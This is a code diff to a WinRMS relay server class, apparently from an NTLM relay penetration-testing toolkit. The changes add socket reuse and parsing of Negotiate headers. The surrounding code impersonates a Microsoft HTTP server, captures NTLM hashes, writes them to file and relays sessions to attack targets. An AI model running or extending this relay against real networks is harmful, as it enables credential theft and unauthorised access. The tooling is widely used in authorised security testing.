@@ -43,7 +43,8 @@ class WinRMSRelayServer(Thread):
             if self.config.ipv6:
                 self.address_family = socket.AF_INET6
             self.wpad_counters = {}
-
+            
+            socketserver.TCPServer.allow_reuse_address = True
             socketserver.TCPServer.__init__(self, server_address, RequestHandlerClass)
 
             key = crypto.PKey()
@@ -73,7 +74,7 @@ class WinRMSRelayServer(Thread):
     class HTTPHandler(http.server.SimpleHTTPRequestHandler):
         def __init__(self,request, client_address, server):
             self.tls_context = server.ssl_context
-            
+
             self.server_version = "Microsoft-HTTPAPI/2.0"
             self.sys_version = ""
             self.server = server
@@ -111,7 +112,7 @@ class WinRMSRelayServer(Thread):
 
         def log_message(self, format, *args):
             return
-        
+
         def send_error(self, code, message=None):
             if message.find('RPC_OUT') >= 0 or message.find('RPC_IN'):
                 LOG.info('WinRMS(%s): send_error path: %s' % (self.server.server_address[1], self.path.lower()))
@@ -187,14 +188,17 @@ class WinRMSRelayServer(Thread):
                 else:
                     typeX = autorizationHeader
                 try:
-                    _, blob = typeX.split('NTLM')
+                    try:
+                        _, blob = typeX.split('NTLM')
+                    # Not using NTLM but Negotiate
+                    except ValueError:
+                        _, blob = typeX.split('Negotiate')
                     token = base64.b64decode(blob.strip())
                 except Exception:
                     LOG.debug("Exception:", exc_info=True)
                     self.do_AUTHHEAD(message = b'NTLM', proxy=proxy)
                 else:
                     messageType = struct.unpack('<L',token[len('NTLMSSP\x00'):len('NTLMSSP\x00')+4])[0]
-
             return token, messageType
 
         def do_HEAD(self):
@@ -440,7 +444,7 @@ class WinRMSRelayServer(Thread):
 
                         LOG.info("WinRMS(%s): Connection from %s@%s controlled, attacking target %s://%s" % (self.server.server_address[1],
                             self.authUser, self.client_address[0], self.target.scheme, self.target.netloc))
-                 
+
                         self.do_REDIRECT()
 
             elif messageType == 3:
@@ -462,7 +466,7 @@ class WinRMSRelayServer(Thread):
                     if self.server.config.disableMulti:
                         self.send_not_found()
                         return
-                    
+
                     # Only skip to next if the login actually failed, not if it was just anonymous login or a system account
                     # which we don't want
                     if authenticateMessage['user_name'] != '':  # and authenticateMessage['user_name'][-1] != '$':
@@ -495,12 +499,12 @@ class WinRMSRelayServer(Thread):
                     if self.server.config.outputFile is not None:
                         writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                               self.server.config.outputFile)
-                        
+
                     if self.server.config.dumpHashes is True:
                         LOG.info(ntlm_hash_data['hash_string'])
 
                     self.do_attack()
-                    
+
                     if self.server.config.disableMulti:
                         # We won't use the redirect trick, closing connection...
                         if self.command == "PROPFIND":
@@ -570,6 +574,6 @@ class WinRMSRelayServer(Thread):
              self.server.serve_forever()
         except KeyboardInterrupt:
              pass
-        
+
         LOG.info('Shutting down WinRMS (HTTPS) Server')
         self.server.server_close()
